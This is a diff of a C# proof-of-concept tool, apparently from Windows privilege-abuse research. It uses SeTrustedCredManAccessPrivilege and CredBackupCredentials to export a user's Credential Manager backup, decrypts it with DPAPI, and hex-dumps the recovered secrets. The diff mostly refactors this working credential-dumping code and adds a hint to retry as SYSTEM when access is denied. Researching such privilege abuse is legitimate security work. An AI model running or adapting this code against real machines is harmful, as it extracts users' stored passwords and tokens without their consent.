@@ -1,9 +1,9 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
-using System.Runtime.InteropServices;
 
 namespace SeTrustedCredManAccessPrivilegePoC
 {
@@ -82,6 +82,12 @@ namespace SeTrustedCredManAccessPrivilegePoC
         /*
          * User defined functions
          */
+        static bool CompareIgnoreCase(string strA, string strB)
+        {
+            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
+        }
+
+
         static string GetWin32ErrorMessage(int code, bool isNtStatus)
         {
             int nReturnedLength;
@@ -97,18 +103,14 @@ namespace SeTrustedCredManAccessPrivilegePoC
 
                 foreach (ProcessModule mod in modules)
                 {
-                    if (string.Compare(
-                        Path.GetFileName(mod.FileName),
-                        "ntdll.dll",
-                        StringComparison.OrdinalIgnoreCase) == 0)
+                    if (CompareIgnoreCase(Path.GetFileName(mod.FileName), "ntdll.dll"))
                     {
                         pNtdll = mod.BaseAddress;
                         break;
                     }
                 }
 
-                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
-                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
+                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE | FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
             }
             else
             {
@@ -125,109 +127,88 @@ namespace SeTrustedCredManAccessPrivilegePoC
                 IntPtr.Zero);
 
             if (nReturnedLength == 0)
-            {
                 return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
-            }
             else
-            {
-                return string.Format(
-                    "[ERROR] Code 0x{0} : {1}",
-                    code.ToString("X8"),
-                    message.ToString().Trim());
-            }
+                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
         }
 
 
-        static bool DumpDPAPICredentials(
-            IntPtr hToken,
-            out uint nBlobSize,
-            out IntPtr pBlobData)
+        static bool DumpDPAPICredentials(IntPtr hToken, out uint nBlobSize, out IntPtr pBlobData)
         {
             int error;
+            bool status;
+            string filePath = Path.GetTempFileName();
             nBlobSize = 0;
             pBlobData = IntPtr.Zero;
-            string filePath = string.Format("{0}\\tmp_dpapi_blob.bin", Environment.CurrentDirectory);
 
             Console.WriteLine("[>] Trying to get an encrypted backup DPAPI blob.");
 
-            if (File.Exists(filePath))
+            do
             {
-                Console.WriteLine("[!] \"{0}\" is already exists.");
+                byte[] data;
+                CRYPT_INTEGER_BLOB dataIn;
+                var ppszDataDescr = new StringBuilder();
 
-                return false;
-            }
+                status = CredBackupCredentials(hToken, filePath, IntPtr.Zero, 0, 0);
 
-            bool status = CredBackupCredentials(
-                hToken,
-                filePath,
-                IntPtr.Zero,
-                0,
-                0);
+                if (!status)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to get an encrypted backup DPAPI blob.");
+                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(error, false));
+                    Console.WriteLine("[*] If you have SeTrustedCredmanAccessPrivilege and got error code 0x00000005, try again as SYSTEM account.\n");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Got an encrypted backup DPAPI blob.");
+                    Console.WriteLine("    |-> File Path : {0}", filePath);
+                }
 
-            if (!status)
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get an encrypted backup DPAPI blob.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                try
+                {
+                    Console.WriteLine("[>] Reading the encrypted backup DPAPI blob.");
+                    data = File.ReadAllBytes(filePath);
 
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Got an encrypted backup DPAPI blob.");
-                Console.WriteLine("    |-> File Path : {0}", filePath);
-            }
+                    Console.WriteLine("[>] Deleting the encrypted backup DPAPI blob.");
+                    File.Delete(filePath);
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Raise exception in file operation.");
+                    break;
+                }
 
-            byte[] data;
+                dataIn = new CRYPT_INTEGER_BLOB { cbData = (uint)data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
+                Marshal.Copy(data, 0, dataIn.pbData, data.Length);
 
-            try
-            {
-                Console.WriteLine("[>] Reading the encrypted backup DPAPI blob.");
-                data = File.ReadAllBytes(filePath);
+                Console.WriteLine("[>] Trying to decrypt the DPAPI blob.");
 
-                Console.WriteLine("[>] Deleting the encrypted backup DPAPI blob.");
-                File.Delete(filePath);
-            }
-            catch
-            {
-                Console.WriteLine("[!] Raise exception in file operation.");
+                status = CryptUnprotectData(
+                    in dataIn,
+                    ppszDataDescr,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    CryptProtectFlags.CRYPTPROTECT_NO_OPTION,
+                    out CRYPT_INTEGER_BLOB dataOut);
+                Marshal.FreeHGlobal(dataIn.pbData);
 
-                return false;
-            }
+                if (!status)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to decrypt the DPAPI blob.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                }
+                else
+                {
+                    Console.WriteLine("[+] DPAPI blob is decrypted successfully.");
+                    nBlobSize = dataOut.cbData;
+                    pBlobData = dataOut.pbData;
+                }
+            } while (false);
 
-            var ppszDataDescr = new StringBuilder();
-            var dataIn = new CRYPT_INTEGER_BLOB { cbData = (uint)data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
-            Marshal.Copy(data, 0, dataIn.pbData, data.Length);
-
-            Console.WriteLine("[>] Trying to decrypt the DPAPI blob.");
-
-            status = CryptUnprotectData(
-                in dataIn,
-                ppszDataDescr,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                CryptProtectFlags.CRYPTPROTECT_NO_OPTION,
-                out CRYPT_INTEGER_BLOB dataOut);
-            Marshal.FreeHGlobal(dataIn.pbData);
-
-            if (!status)
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to decrypt the DPAPI blob.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] DPAPI blob is decrypted successfully.");
-            }
-
-            nBlobSize = dataOut.cbData;
-            pBlobData = dataOut.pbData;
-
-            return true;
+            return status;
         }
 
 
@@ -239,10 +220,7 @@ namespace SeTrustedCredManAccessPrivilegePoC
             Console.WriteLine("[*] This PoC tries to get a decrypted DPAPI blob for current user.");
             Console.WriteLine("[*] Current User : {0}\\{1}", Environment.UserDomainName, Environment.UserName);
 
-            if (DumpDPAPICredentials(
-                hToken,
-                out uint nBlobSize,
-                out IntPtr pBlobData))
+            if (DumpDPAPICredentials(hToken, out uint nBlobSize, out IntPtr pBlobData))
             {
                 Console.WriteLine("[*] Decrypted Data:\n");
                 HexDump.Dump(pBlobData, (uint)nBlobSize, 1);
